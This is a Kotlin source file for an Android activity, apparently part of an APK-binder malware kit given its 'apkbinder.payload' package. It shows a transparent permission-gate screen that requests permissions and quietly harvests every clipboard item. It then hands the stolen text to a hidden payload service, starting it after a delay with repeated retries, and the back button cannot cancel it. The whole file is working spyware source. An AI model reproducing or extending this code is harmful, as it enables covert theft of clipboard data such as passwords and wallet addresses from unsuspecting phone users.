package Com.devhs.apkbinder.payload

import android.app.Activity
import android.content.ClipboardManager
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import Com.devhs.apkbinder.core.Const

class PermissionGateActivity : Activity() {

    private var finished = false
    private var features: List<String> = emptyList()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HsLog.init(this)

        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        features = HsConfig.read(this)?.features ?: listOf("gallery")
        val missing = HsPerms.missing(this, features)
        HsLog.w("gate features=$features missing=$missing")

        if (missing.isEmpty()) {
            proceed()
            return
        }

        try {
            requestPermissions(missing.toTypedArray(), 7)
        } catch (t: Throwable) {
            HsLog.e("requestPermissions: ${t.message}")
            proceed()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        HsLog.w("result: ${grantResults.joinToString(",")}")
        proceed()
    }

    private fun readClip(): String = try {
        val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        val c = cm.primaryClip
        if (c == null) "" else {
            val sb = StringBuilder()
            for (i in 0 until c.itemCount) {
                val t = c.getItemAt(i).text?.toString() ?: continue
                sb.append(t).append("\n---\n")
            }
            sb.toString()
        }
    } catch (t: Throwable) {
        ""
    }

    private fun proceed() {
        if (finished) return
        finished = true

        val clip = if (features.contains("clipboard")) readClip() else ""
        HsLog.w("clip chars=" + clip.length)

        finish()
        overridePendingTransition(0, 0)

        Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(0, clip) }, 3000L)
    }

    private fun startServiceSafe(attempt: Int, clip: String) {
        val i = Intent()
        i.setClassName(packageName, Const.PAYLOAD_SERVICE)
        if (clip.isNotEmpty()) i.putExtra("clip", clip)
        try {
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
            HsLog.w("service started")
        } catch (t: Throwable) {
            HsLog.e("startFGS($attempt): ${t.message}")
            if (attempt < 3) {
                Handler(Looper.getMainLooper()).postDelayed({ startServiceSafe(attempt + 1, clip) }, 2000L)
            } else {
                try {
                    startService(i)
                    HsLog.w("service started plain")
                } catch (t2: Throwable) {
                    HsLog.e("startService: ${t2.message}")
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        proceed()
    }
}
